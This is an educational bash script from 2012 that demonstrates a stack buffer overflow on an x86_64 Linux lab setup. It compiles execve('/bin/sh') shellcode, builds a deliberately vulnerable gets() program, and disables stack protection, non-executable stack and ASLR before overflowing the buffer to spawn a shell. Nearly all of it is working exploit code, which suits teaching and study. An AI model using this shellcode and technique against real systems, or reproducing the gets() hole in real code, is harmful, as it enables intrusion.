#!/bin/bash
# Ben Lynn 2012

# Demonstrates a classic buffer overflow exploit.
# Works on Ubuntu 12.04 on x86_64.

# Setup temp dir.

origdir=`pwd`
tmpdir=`mktemp -d`
#cd $tmpdir
#echo temp dir: $tmpdir

# A C program that wraps position-independent assembly that launches a shell.

echo compiling shell launcher...
cat > launch.c << "EOF"
int main(int argc, char **argv) {
  asm("\
needle0: jmp there\n\
here: pop %rdi\n\
xor %rax, %rax\n\
movb $0x3b, %al\n\
xor %rsi, %rsi\n\
xor %rdx, %rdx\n\
syscall\n\
there: call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
EOF
gcc -o launch launch.c

# Extract the machine code into a file named "shellcode".

echo extracting shellcode...
addr=0x`objdump -d launch | grep needle0 | cut -d\  -f1`
addr=$((addr-0x400000))
echo ...shellcode starts at offset $addr
# The redirection is for older versions of xxd, which seem to write nothing to
# the output file when -p is present.
xxd -s$addr -l32 -p launch > shellcode

# Here's the victim program. It conveniently prints the buffer address.

echo compiling victim...
cat > victim.c << "EOF"
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
EOF
cat victim.c
gcc -fno-stack-protector -o victim victim.c
echo disabling executable space protection...
execstack -s victim
echo finding buffer address...
addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
echo ...name[64] starts at $addr
echo exploiting victim...
a=`printf %016x $addr | tac -rs..`

# Attack! Overflow the buffer to start a shell.
# Hit Enter a few times, then enter commands.

( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch `arch` -R ./victim

# Clean up temp dir.

#echo removing temp dir...
#cd $origdir
#rm -r $tmpdir
